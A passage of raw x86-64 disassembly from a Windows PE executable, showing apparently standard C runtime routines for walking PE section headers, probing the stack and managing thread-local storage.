   1400063e1:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1400063e5:	48 01 c2             	add    %rax,%rdx
   1400063e8:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   1400063ec:	48 8d 5c 02 18       	lea    0x18(%rdx,%rax,1),%rbx
   1400063f1:	0f b7 42 06          	movzwl 0x6(%rdx),%eax
   1400063f5:	85 c0                	test   %eax,%eax
   1400063f7:	74 47                	je     0x140006440
   1400063f9:	83 e8 01             	sub    $0x1,%eax
   1400063fc:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140006400:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
   140006405:	eb 12                	jmp    0x140006419
   140006407:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000640e:	00 00 
   140006410:	48 83 c3 28          	add    $0x28,%rbx
   140006414:	48 39 fb             	cmp    %rdi,%rbx
   140006417:	74 27                	je     0x140006440
   140006419:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000641f:	48 89 f2             	mov    %rsi,%rdx
   140006422:	48 89 d9             	mov    %rbx,%rcx
   140006425:	e8 ce 56 00 00       	call   0x14000baf8
   14000642a:	85 c0                	test   %eax,%eax
   14000642c:	75 e2                	jne    0x140006410
   14000642e:	48 89 d8             	mov    %rbx,%rax
   140006431:	48 83 c4 20          	add    $0x20,%rsp
   140006435:	5b                   	pop    %rbx
   140006436:	5e                   	pop    %rsi
   140006437:	5f                   	pop    %rdi
   140006438:	c3                   	ret
   140006439:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140006440:	31 db                	xor    %ebx,%ebx
   140006442:	48 89 d8             	mov    %rbx,%rax
   140006445:	48 83 c4 20          	add    $0x20,%rsp
   140006449:	5b                   	pop    %rbx
   14000644a:	5e                   	pop    %rsi
   14000644b:	5f                   	pop    %rdi
   14000644c:	c3                   	ret
   14000644d:	0f 1f 00             	nopl   (%rax)
   140006450:	48 83 ec 28          	sub    $0x28,%rsp
   140006454:	4c 8b 0d 25 37 38 00 	mov    0x383725(%rip),%r9        # 0x140389b80
   14000645b:	31 d2                	xor    %edx,%edx
   14000645d:	66 41 81 39 4d 5a    	cmpw   $0x5a4d,(%r9)
   140006463:	49 89 c8             	mov    %rcx,%r8
   140006466:	75 57                	jne    0x1400064bf
   140006468:	4c 89 c9             	mov    %r9,%rcx
   14000646b:	e8 b0 fe ff ff       	call   0x140006320
   140006470:	85 c0                	test   %eax,%eax
   140006472:	74 4b                	je     0x1400064bf
   140006474:	49 63 41 3c          	movslq 0x3c(%r9),%rax
   140006478:	4c 89 c1             	mov    %r8,%rcx
   14000647b:	4c 29 c9             	sub    %r9,%rcx
   14000647e:	49 01 c1             	add    %rax,%r9
   140006481:	41 0f b7 41 14       	movzwl 0x14(%r9),%eax
   140006486:	49 8d 54 01 18       	lea    0x18(%r9,%rax,1),%rdx
   14000648b:	41 0f b7 41 06       	movzwl 0x6(%r9),%eax
   140006490:	85 c0                	test   %eax,%eax
   140006492:	74 29                	je     0x1400064bd
   140006494:	83 e8 01             	sub    $0x1,%eax
   140006497:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   14000649b:	4c 8d 4c c2 28       	lea    0x28(%rdx,%rax,8),%r9
   1400064a0:	44 8b 42 0c          	mov    0xc(%rdx),%r8d
   1400064a4:	4c 39 c1             	cmp    %r8,%rcx
   1400064a7:	4c 89 c0             	mov    %r8,%rax
   1400064aa:	72 08                	jb     0x1400064b4
   1400064ac:	03 42 08             	add    0x8(%rdx),%eax
   1400064af:	48 39 c1             	cmp    %rax,%rcx
   1400064b2:	72 0b                	jb     0x1400064bf
   1400064b4:	48 83 c2 28          	add    $0x28,%rdx
   1400064b8:	4c 39 ca             	cmp    %r9,%rdx
   1400064bb:	75 e3                	jne    0x1400064a0
   1400064bd:	31 d2                	xor    %edx,%edx
   1400064bf:	48 89 d0             	mov    %rdx,%rax
   1400064c2:	48 83 c4 28          	add    $0x28,%rsp
   1400064c6:	c3                   	ret
   1400064c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400064ce:	00 00 
   1400064d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400064d4:	48 8b 15 a5 36 38 00 	mov    0x3836a5(%rip),%rdx        # 0x140389b80
   1400064db:	45 31 c0             	xor    %r8d,%r8d
   1400064de:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   1400064e3:	75 16                	jne    0x1400064fb
   1400064e5:	48 89 d1             	mov    %rdx,%rcx
   1400064e8:	e8 33 fe ff ff       	call   0x140006320
   1400064ed:	85 c0                	test   %eax,%eax
   1400064ef:	74 0a                	je     0x1400064fb
   1400064f1:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1400064f5:	44 0f b7 44 10 06    	movzwl 0x6(%rax,%rdx,1),%r8d
   1400064fb:	44 89 c0             	mov    %r8d,%eax
   1400064fe:	48 83 c4 28          	add    $0x28,%rsp
   140006502:	c3                   	ret
   140006503:	0f 1f 00             	nopl   (%rax)
   140006506:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000650d:	00 00 00 
   140006510:	48 83 ec 28          	sub    $0x28,%rsp
   140006514:	4c 8b 0d 65 36 38 00 	mov    0x383665(%rip),%r9        # 0x140389b80
   14000651b:	31 d2                	xor    %edx,%edx
   14000651d:	66 41 81 39 4d 5a    	cmpw   $0x5a4d,(%r9)
   140006523:	49 89 c8             	mov    %rcx,%r8
   140006526:	75 52                	jne    0x14000657a
   140006528:	4c 89 c9             	mov    %r9,%rcx
   14000652b:	e8 f0 fd ff ff       	call   0x140006320
   140006530:	85 c0                	test   %eax,%eax
   140006532:	74 46                	je     0x14000657a
   140006534:	49 63 41 3c          	movslq 0x3c(%r9),%rax
   140006538:	49 01 c1             	add    %rax,%r9
   14000653b:	41 0f b7 41 14       	movzwl 0x14(%r9),%eax
   140006540:	49 8d 54 01 18       	lea    0x18(%r9,%rax,1),%rdx
   140006545:	41 0f b7 41 06       	movzwl 0x6(%r9),%eax
   14000654a:	85 c0                	test   %eax,%eax
   14000654c:	74 2a                	je     0x140006578
   14000654e:	83 e8 01             	sub    $0x1,%eax
   140006551:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140006555:	48 8d 44 c2 28       	lea    0x28(%rdx,%rax,8),%rax
   14000655a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140006560:	f6 42 27 20          	testb  $0x20,0x27(%rdx)
   140006564:	74 09                	je     0x14000656f
   140006566:	4d 85 c0             	test   %r8,%r8
   140006569:	74 0f                	je     0x14000657a
   14000656b:	49 83 e8 01          	sub    $0x1,%r8
   14000656f:	48 83 c2 28          	add    $0x28,%rdx
   140006573:	48 39 c2             	cmp    %rax,%rdx
   140006576:	75 e8                	jne    0x140006560
   140006578:	31 d2                	xor    %edx,%edx
   14000657a:	48 89 d0             	mov    %rdx,%rax
   14000657d:	48 83 c4 28          	add    $0x28,%rsp
   140006581:	c3                   	ret
   140006582:	0f 1f 40 00          	nopl   0x0(%rax)
   140006586:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000658d:	00 00 00 
   140006590:	48 83 ec 28          	sub    $0x28,%rsp
   140006594:	4c 8b 05 e5 35 38 00 	mov    0x3835e5(%rip),%r8        # 0x140389b80
   14000659b:	31 d2                	xor    %edx,%edx
   14000659d:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
   1400065a3:	75 0e                	jne    0x1400065b3
   1400065a5:	4c 89 c1             	mov    %r8,%rcx
   1400065a8:	e8 73 fd ff ff       	call   0x140006320
   1400065ad:	85 c0                	test   %eax,%eax
   1400065af:	49 0f 45 d0          	cmovne %r8,%rdx
   1400065b3:	48 89 d0             	mov    %rdx,%rax
   1400065b6:	48 83 c4 28          	add    $0x28,%rsp
   1400065ba:	c3                   	ret
   1400065bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400065c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400065c4:	4c 8b 05 b5 35 38 00 	mov    0x3835b5(%rip),%r8        # 0x140389b80
   1400065cb:	31 c0                	xor    %eax,%eax
   1400065cd:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
   1400065d3:	48 89 ca             	mov    %rcx,%rdx
   1400065d6:	75 57                	jne    0x14000662f
   1400065d8:	4c 89 c1             	mov    %r8,%rcx
   1400065db:	e8 40 fd ff ff       	call   0x140006320
   1400065e0:	85 c0                	test   %eax,%eax
   1400065e2:	74 4b                	je     0x14000662f
   1400065e4:	49 63 40 3c          	movslq 0x3c(%r8),%rax
   1400065e8:	48 89 d1             	mov    %rdx,%rcx
   1400065eb:	4c 29 c1             	sub    %r8,%rcx
   1400065ee:	49 01 c0             	add    %rax,%r8
   1400065f1:	41 0f b7 50 06       	movzwl 0x6(%r8),%edx
   1400065f6:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   1400065fb:	85 d2                	test   %edx,%edx
   1400065fd:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
   140006602:	74 29                	je     0x14000662d
   140006604:	83 ea 01             	sub    $0x1,%edx
   140006607:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   14000660b:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   140006610:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140006614:	4c 39 c1             	cmp    %r8,%rcx
   140006617:	4c 89 c2             	mov    %r8,%rdx
   14000661a:	72 08                	jb     0x140006624
   14000661c:	03 50 08             	add    0x8(%rax),%edx
   14000661f:	48 39 d1             	cmp    %rdx,%rcx
   140006622:	72 10                	jb     0x140006634
   140006624:	48 83 c0 28          	add    $0x28,%rax
   140006628:	4c 39 c8             	cmp    %r9,%rax
   14000662b:	75 e3                	jne    0x140006610
   14000662d:	31 c0                	xor    %eax,%eax
   14000662f:	48 83 c4 28          	add    $0x28,%rsp
   140006633:	c3                   	ret
   140006634:	8b 40 24             	mov    0x24(%rax),%eax
   140006637:	f7 d0                	not    %eax
   140006639:	c1 e8 1f             	shr    $0x1f,%eax
   14000663c:	48 83 c4 28          	add    $0x28,%rsp
   140006640:	c3                   	ret
   140006641:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006646:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000664d:	00 00 00 
   140006650:	48 83 ec 28          	sub    $0x28,%rsp
   140006654:	4c 8b 1d 25 35 38 00 	mov    0x383525(%rip),%r11        # 0x140389b80
   14000665b:	45 31 c9             	xor    %r9d,%r9d
   14000665e:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
   140006664:	41 89 c8             	mov    %ecx,%r8d
   140006667:	75 5a                	jne    0x1400066c3
   140006669:	4c 89 d9             	mov    %r11,%rcx
   14000666c:	e8 af fc ff ff       	call   0x140006320
   140006671:	85 c0                	test   %eax,%eax
   140006673:	74 4e                	je     0x1400066c3
   140006675:	49 63 4b 3c          	movslq 0x3c(%r11),%rcx
   140006679:	4c 01 d9             	add    %r11,%rcx
   14000667c:	8b 81 90 00 00 00    	mov    0x90(%rcx),%eax
   140006682:	85 c0                	test   %eax,%eax
   140006684:	74 3d                	je     0x1400066c3
   140006686:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   14000668a:	48 8d 54 11 18       	lea    0x18(%rcx,%rdx,1),%rdx
   14000668f:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
   140006693:	85 c9                	test   %ecx,%ecx
   140006695:	74 2c                	je     0x1400066c3
   140006697:	83 e9 01             	sub    $0x1,%ecx
   14000669a:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   14000669e:	4c 8d 54 ca 28       	lea    0x28(%rdx,%rcx,8),%r10
   1400066a3:	44 8b 4a 0c          	mov    0xc(%rdx),%r9d
   1400066a7:	4c 39 c8             	cmp    %r9,%rax
   1400066aa:	4c 89 c9             	mov    %r9,%rcx
   1400066ad:	72 08                	jb     0x1400066b7
   1400066af:	03 4a 08             	add    0x8(%rdx),%ecx
   1400066b2:	48 39 c8             	cmp    %rcx,%rax
   1400066b5:	72 19                	jb     0x1400066d0
   1400066b7:	48 83 c2 28          	add    $0x28,%rdx
   1400066bb:	4c 39 d2             	cmp    %r10,%rdx
   1400066be:	75 e3                	jne    0x1400066a3
   1400066c0:	45 31 c9             	xor    %r9d,%r9d
   1400066c3:	4c 89 c8             	mov    %r9,%rax
   1400066c6:	48 83 c4 28          	add    $0x28,%rsp
   1400066ca:	c3                   	ret
   1400066cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400066d0:	4c 01 d8             	add    %r11,%rax
   1400066d3:	75 13                	jne    0x1400066e8
   1400066d5:	eb e9                	jmp    0x1400066c0
   1400066d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400066de:	00 00 
   1400066e0:	41 83 e8 01          	sub    $0x1,%r8d
   1400066e4:	48 83 c0 14          	add    $0x14,%rax
   1400066e8:	8b 48 04             	mov    0x4(%rax),%ecx
   1400066eb:	85 c9                	test   %ecx,%ecx
   1400066ed:	75 07                	jne    0x1400066f6
   1400066ef:	8b 50 0c             	mov    0xc(%rax),%edx
   1400066f2:	85 d2                	test   %edx,%edx
   1400066f4:	74 ca                	je     0x1400066c0
   1400066f6:	45 85 c0             	test   %r8d,%r8d
   1400066f9:	7f e5                	jg     0x1400066e0
   1400066fb:	44 8b 48 0c          	mov    0xc(%rax),%r9d
   1400066ff:	4d 01 d9             	add    %r11,%r9
   140006702:	4c 89 c8             	mov    %r9,%rax
   140006705:	48 83 c4 28          	add    $0x28,%rsp
   140006709:	c3                   	ret
   14000670a:	90                   	nop
   14000670b:	90                   	nop
   14000670c:	90                   	nop
   14000670d:	90                   	nop
   14000670e:	90                   	nop
   14000670f:	90                   	nop
   140006710:	51                   	push   %rcx
   140006711:	50                   	push   %rax
   140006712:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140006718:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000671d:	72 19                	jb     0x140006738
   14000671f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140006726:	48 83 09 00          	orq    $0x0,(%rcx)
   14000672a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   140006730:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140006736:	77 e7                	ja     0x14000671f
   140006738:	48 29 c1             	sub    %rax,%rcx
   14000673b:	48 83 09 00          	orq    $0x0,(%rcx)
   14000673f:	58                   	pop    %rax
   140006740:	59                   	pop    %rcx
   140006741:	c3                   	ret
   140006742:	90                   	nop
   140006743:	90                   	nop
   140006744:	90                   	nop
   140006745:	90                   	nop
   140006746:	90                   	nop
   140006747:	90                   	nop
   140006748:	90                   	nop
   140006749:	90                   	nop
   14000674a:	90                   	nop
   14000674b:	90                   	nop
   14000674c:	90                   	nop
   14000674d:	90                   	nop
   14000674e:	90                   	nop
   14000674f:	90                   	nop
   140006750:	57                   	push   %rdi
   140006751:	56                   	push   %rsi
   140006752:	53                   	push   %rbx
   140006753:	48 83 ec 20          	sub    $0x20,%rsp
   140006757:	48 8b 39             	mov    (%rcx),%rdi
   14000675a:	48 85 ff             	test   %rdi,%rdi
   14000675d:	48 89 ce             	mov    %rcx,%rsi
   140006760:	74 22                	je     0x140006784
   140006762:	31 db                	xor    %ebx,%ebx
   140006764:	0f 1f 40 00          	nopl   0x0(%rax)
   140006768:	48 8b 44 de 08       	mov    0x8(%rsi,%rbx,8),%rax
   14000676d:	48 85 c0             	test   %rax,%rax
   140006770:	74 09                	je     0x14000677b
   140006772:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140006776:	e8 25 53 00 00       	call   0x14000baa0
   14000677b:	48 83 c3 01          	add    $0x1,%rbx
   14000677f:	48 39 df             	cmp    %rbx,%rdi
   140006782:	75 e4                	jne    0x140006768
   140006784:	48 89 f1             	mov    %rsi,%rcx
   140006787:	48 83 c4 20          	add    $0x20,%rsp
   14000678b:	5b                   	pop    %rbx
   14000678c:	5e                   	pop    %rsi
   14000678d:	5f                   	pop    %rdi
   14000678e:	e9 0d 53 00 00       	jmp    0x14000baa0
   140006793:	0f 1f 00             	nopl   (%rax)
   140006796:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000679d:	00 00 00 
   1400067a0:	57                   	push   %rdi
   1400067a1:	56                   	push   %rsi
   1400067a2:	53                   	push   %rbx
   1400067a3:	48 83 ec 20          	sub    $0x20,%rsp
   1400067a7:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   1400067ab:	48 8b 39             	mov    (%rcx),%rdi
   1400067ae:	48 83 fe 08          	cmp    $0x8,%rsi
   1400067b2:	48 89 cb             	mov    %rcx,%rbx
   1400067b5:	77 39                	ja     0x1400067f0
   1400067b7:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   1400067bb:	e8 00 53 00 00       	call   0x14000bac0
   1400067c0:	48 85 c0             	test   %rax,%rax
   1400067c3:	74 6d                	je     0x140006832
   1400067c5:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400067c9:	48 89 00             	mov    %rax,(%rax)
   1400067cc:	4c 8d 48 08          	lea    0x8(%rax),%r9
   1400067d0:	49 89 f8             	mov    %rdi,%r8
   1400067d3:	48 85 d2             	test   %rdx,%rdx
   1400067d6:	74 42                	je     0x14000681a
   1400067d8:	4c 89 c9             	mov    %r9,%rcx
   1400067db:	e8 e8 52 00 00       	call   0x14000bac8
   1400067e0:	49 89 c1             	mov    %rax,%r9
   1400067e3:	4c 89 c8             	mov    %r9,%rax
   1400067e6:	48 83 c4 20          	add    $0x20,%rsp
   1400067ea:	5b                   	pop    %rbx
   1400067eb:	5e                   	pop    %rsi
   1400067ec:	5f                   	pop    %rdi
   1400067ed:	c3                   	ret
   1400067ee:	66 90                	xchg   %ax,%ax
   1400067f0:	48 8d 4c 3e 07       	lea    0x7(%rsi,%rdi,1),%rcx
   1400067f5:	e8 c6 52 00 00       	call   0x14000bac0
   1400067fa:	48 85 c0             	test   %rax,%rax
   1400067fd:	74 33                	je     0x140006832
   1400067ff:	4c 8d 4c 30 07       	lea    0x7(%rax,%rsi,1),%r9
   140006804:	48 f7 de             	neg    %rsi
   140006807:	49 89 f8             	mov    %rdi,%r8
   14000680a:	49 21 f1             	and    %rsi,%r9
   14000680d:	49 89 41 f8          	mov    %rax,-0x8(%r9)
   140006811:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140006815:	48 85 d2             	test   %rdx,%rdx
   140006818:	75 be                	jne    0x1400067d8
   14000681a:	4c 89 c9             	mov    %r9,%rcx
   14000681d:	31 d2                	xor    %edx,%edx
   14000681f:	e8 ac 52 00 00       	call   0x14000bad0
   140006824:	49 89 c1             	mov    %rax,%r9
   140006827:	4c 89 c8             	mov    %r9,%rax
   14000682a:	48 83 c4 20          	add    $0x20,%rsp
   14000682e:	5b                   	pop    %rbx
   14000682f:	5e                   	pop    %rsi
   140006830:	5f                   	pop    %rdi
   140006831:	c3                   	ret
   140006832:	e8 41 52 00 00       	call   0x14000ba78
   140006837:	90                   	nop
   140006838:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000683f:	00 
   140006840:	48 83 ec 28          	sub    $0x28,%rsp
   140006844:	45 31 c9             	xor    %r9d,%r9d
   140006847:	31 d2                	xor    %edx,%edx
   140006849:	31 c9                	xor    %ecx,%ecx
   14000684b:	c7 05 8b 59 38 00 ff 	movl   $0xffffffff,0x38598b(%rip)        # 0x14038c1e0
   140006852:	ff ff ff 
   140006855:	41 b8 ff ff 00 00    	mov    $0xffff,%r8d
   14000685b:	ff 15 e3 69 38 00    	call   *0x3869e3(%rip)        # 0x14038d244
   140006861:	48 89 05 80 59 38 00 	mov    %rax,0x385980(%rip)        # 0x14038c1e8
   140006868:	ff 15 46 6a 38 00    	call   *0x386a46(%rip)        # 0x14038d2b4
   14000686e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006871:	74 1d                	je     0x140006890
   140006873:	48 8d 15 d6 fe ff ff 	lea    -0x12a(%rip),%rdx        # 0x140006750
   14000687a:	89 c1                	mov    %eax,%ecx
   14000687c:	89 05 56 59 38 00    	mov    %eax,0x385956(%rip)        # 0x14038c1d8
   140006882:	e8 69 53 00 00       	call   0x14000bbf0
   140006887:	85 c0                	test   %eax,%eax
   140006889:	75 0d                	jne    0x140006898
   14000688b:	48 83 c4 28          	add    $0x28,%rsp
   14000688f:	c3                   	ret
   140006890:	ff 15 c6 69 38 00    	call   *0x3869c6(%rip)        # 0x14038d25c
   140006896:	eb ef                	jmp    0x140006887
   140006898:	e8 db 51 00 00       	call   0x14000ba78
   14000689d:	90                   	nop
   14000689e:	66 90                	xchg   %ax,%ax
   1400068a0:	41 55                	push   %r13
   1400068a2:	41 54                	push   %r12
   1400068a4:	55                   	push   %rbp
   1400068a5:	57                   	push   %rdi
   1400068a6:	56                   	push   %rsi
   1400068a7:	53                   	push   %rbx
   1400068a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400068ac:	48 8b 35 6d 32 38 00 	mov    0x38326d(%rip),%rsi        # 0x140389b20
   1400068b3:	44 8b 1e             	mov    (%rsi),%r11d
   1400068b6:	48 89 cb             	mov    %rcx,%rbx
   1400068b9:	45 85 db             	test   %r11d,%r11d
   1400068bc:	75 1a                	jne    0x1400068d8
   1400068be:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400068c2:	48 85 c0             	test   %rax,%rax
   1400068c5:	74 79                	je     0x140006940
   1400068c7:	48 83 c4 28          	add    $0x28,%rsp
   1400068cb:	5b                   	pop    %rbx
   1400068cc:	5e                   	pop    %rsi
   1400068cd:	5f                   	pop    %rdi
   1400068ce:	5d                   	pop    %rbp
   1400068cf:	41 5c                	pop    %r12
   1400068d1:	41 5d                	pop    %r13
   1400068d3:	c3                   	ret
   1400068d4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400068d8:	4c 8b 61 10          	mov    0x10(%rcx),%r12
   1400068dc:	4d 85 e4             	test   %r12,%r12
   1400068df:	74 6f                	je     0x140006950
   1400068e1:	8b 35 f1 58 38 00    	mov    0x3858f1(%rip),%esi        # 0x14038c1d8
   1400068e7:	4c 8b 2d 6e 69 38 00 	mov    0x38696e(%rip),%r13        # 0x14038d25c
   1400068ee:	41 ff d5             	call   *%r13
   1400068f1:	89 c7                	mov    %eax,%edi
   1400068f3:	89 f1                	mov    %esi,%ecx
   1400068f5:	ff 15 c9 69 38 00    	call   *0x3869c9(%rip)        # 0x14038d2c4
   1400068fb:	89 f9                	mov    %edi,%ecx
   1400068fd:	48 89 c6             	mov    %rax,%rsi
   140006900:	ff 15 96 69 38 00    	call   *0x386996(%rip)        # 0x14038d29c
   140006906:	48 85 f6             	test   %rsi,%rsi
   140006909:	0f 84 b1 00 00 00    	je     0x1400069c0
   14000690f:	48 8b 2e             	mov    (%rsi),%rbp
   140006912:	4c 39 e5             	cmp    %r12,%rbp
   140006915:	0f 82 ed 00 00 00    	jb     0x140006a08
   14000691b:	49 83 ec 01          	sub    $0x1,%r12
   14000691f:	4a 8b 44 e6 08       	mov    0x8(%rsi,%r12,8),%rax
   140006924:	48 85 c0             	test   %rax,%rax
   140006927:	75 9e                	jne    0x1400068c7
   140006929:	48 89 d9             	mov    %rbx,%rcx
   14000692c:	e8 6f fe ff ff       	call   0x1400067a0
   140006931:	4a 89 44 e6 08       	mov    %rax,0x8(%rsi,%r12,8)
   140006936:	eb 8f                	jmp    0x1400068c7
   140006938:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000693f:	00 
   140006940:	e8 5b fe ff ff       	call   0x1400067a0
   140006945:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140006949:	e9 79 ff ff ff       	jmp    0x1400068c7
   14000694e:	66 90                	xchg   %ax,%ax
   140006950:	44 8b 16             	mov    (%rsi),%r10d
   140006953:	45 85 d2             	test   %r10d,%r10d
   140006956:	0f 84 0e 01 00 00    	je     0x140006a6a
   14000695c:	44 8b 0d 2d 1b 38 00 	mov    0x381b2d(%rip),%r9d        # 0x140388490
   140006963:	45 85 c9             	test   %r9d,%r9d
   140006966:	0f 84 2c 01 00 00    	je     0x140006a98
   14000696c:	f0 83 05 6c 58 38 00 	lock addl $0x1,0x38586c(%rip)        # 0x14038c1e0
   140006973:	01 
   140006974:	0f 85 52 01 00 00    	jne    0x140006acc
   14000697a:	4c 8b 63 10          	mov    0x10(%rbx),%r12
   14000697e:	4d 85 e4             	test   %r12,%r12
   140006981:	0f 84 f0 00 00 00    	je     0x140006a77
   140006987:	8b 06                	mov    (%rsi),%eax
   140006989:	85 c0                	test   %eax,%eax
   14000698b:	0f 84 50 ff ff ff    	je     0x1400068e1
   140006991:	f0 83 2d 47 58 38 00 	lock subl $0x1,0x385847(%rip)        # 0x14038c1e0
   140006998:	01 
   140006999:	0f 88 42 ff ff ff    	js     0x1400068e1
   14000699f:	48 8b 0d 42 58 38 00 	mov    0x385842(%rip),%rcx        # 0x14038c1e8
   1400069a6:	45 31 c0             	xor    %r8d,%r8d
   1400069a9:	ba 01 00 00 00       	mov    $0x1,%edx
   1400069ae:	ff 15 e0 68 38 00    	call   *0x3868e0(%rip)        # 0x14038d294
   1400069b4:	e9 28 ff ff ff       	jmp    0x1400068e1
   1400069b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400069c0:	49 8d 4c 24 21       	lea    0x21(%r12),%rcx
   1400069c5:	ba 08 00 00 00       	mov    $0x8,%edx
   1400069ca:	e8 b1 50 00 00       	call   0x14000ba80
   1400069cf:	49 8d 7c 24 20       	lea    0x20(%r12),%rdi
   1400069d4:	48 85 c0             	test   %rax,%rax
   1400069d7:	48 89 c6             	mov    %rax,%rsi
   1400069da:	0f 84 13 01 00 00    	je     0x140006af3
   1400069e0:	48 89 38             	mov    %rdi,(%rax)
   1400069e3:	8b 0d ef 57 38 00    	mov    0x3857ef(%rip),%ecx        # 0x14038c1d8
   1400069e9:	48 89 f2             	mov    %rsi,%rdx
   1400069ec:	ff 15 da 68 38 00    	call   *0x3868da(%rip)        # 0x14038d2cc
   1400069f2:	85 c0                	test   %eax,%eax
   1400069f4:	0f 85 21 ff ff ff    	jne    0x14000691b
   1400069fa:	41 ff d5             	call   *%r13
   1400069fd:	e9 19 ff ff ff       	jmp    0x14000691b
   140006a02:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140006a08:	48 8d 7c 2d 00       	lea    0x0(%rbp,%rbp,1),%rdi
   140006a0d:	48 89 f1             	mov    %rsi,%rcx
   140006a10:	49 8d 44 24 20       	lea    0x20(%r12),%rax
   140006a15:	4c 39 e7             	cmp    %r12,%rdi
   140006a18:	48 0f 42 f8          	cmovb  %rax,%rdi
   140006a1c:	48 8d 14 fd 08 00 00 	lea    0x8(,%rdi,8),%rdx
   140006a23:	00 
   140006a24:	e8 af 50 00 00       	call   0x14000bad8
   140006a29:	48 85 c0             	test   %rax,%rax
   140006a2c:	48 89 c6             	mov    %rax,%rsi
   140006a2f:	0f 84 be 00 00 00    	je     0x140006af3
   140006a35:	48 89 38             	mov    %rdi,(%rax)
   140006a38:	48 8d 4c e8 08       	lea    0x8(%rax,%rbp,8),%rcx
   140006a3d:	48 29 ef             	sub    %rbp,%rdi
   140006a40:	31 d2                	xor    %edx,%edx
   140006a42:	4c 8d 04 fd 00 00 00 	lea    0x0(,%rdi,8),%r8
   140006a49:	00 
   140006a4a:	e8 81 50 00 00       	call   0x14000bad0
   140006a4f:	eb 92                	jmp    0x1400069e3
   140006a51:	e8 ea fd ff ff       	call   0x140006840
   140006a56:	c7 05 30 1a 38 00 01 	movl   $0x1,0x381a30(%rip)        # 0x140388490
   140006a5d:	00 00 00 
   140006a60:	8b 16                	mov    (%rsi),%edx
   140006a62:	85 d2                	test   %edx,%edx
   140006a64:	0f 85 02 ff ff ff    	jne    0x14000696c
   140006a6a:	4c 8b 63 10          	mov    0x10(%rbx),%r12
   140006a6e:	4d 85 e4             	test   %r12,%r12
   140006a71:	0f 85 6a fe ff ff    	jne    0x1400068e1
   140006a77:	48 8b 05 52 57 38 00 	mov    0x385752(%rip),%rax        # 0x14038c1d0
   140006a7e:	4c 8d 60 01          	lea    0x1(%rax),%r12
   140006a82:	4c 89 25 47 57 38 00 	mov    %r12,0x385747(%rip)        # 0x14038c1d0
   140006a89:	4c 89 63 10          	mov    %r12,0x10(%rbx)
   140006a8d:	e9 f5 fe ff ff       	jmp    0x140006987
   140006a92:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140006a98:	f0 83 05 f4 19 38 00 	lock addl $0x1,0x3819f4(%rip)        # 0x140388494
   140006a9f:	01 
   140006aa0:	74 af                	je     0x140006a51
   140006aa2:	44 8b 05 e7 19 38 00 	mov    0x3819e7(%rip),%r8d        # 0x140388490
   140006aa9:	48 8d 3d e0 19 38 00 	lea    0x3819e0(%rip),%rdi        # 0x140388490
   140006ab0:	48 8b 2d f5 67 38 00 	mov    0x3867f5(%rip),%rbp        # 0x14038d2ac
   140006ab7:	45 85 c0             	test   %r8d,%r8d
   140006aba:	75 a4                	jne    0x140006a60
   140006abc:	0f 1f 40 00          	nopl   0x0(%rax)
   140006ac0:	31 c9                	xor    %ecx,%ecx
   140006ac2:	ff d5                	call   *%rbp
   140006ac4:	8b 0f                	mov    (%rdi),%ecx
   140006ac6:	85 c9                	test   %ecx,%ecx
   140006ac8:	74 f6                	je     0x140006ac0
   140006aca:	eb 94                	jmp    0x140006a60
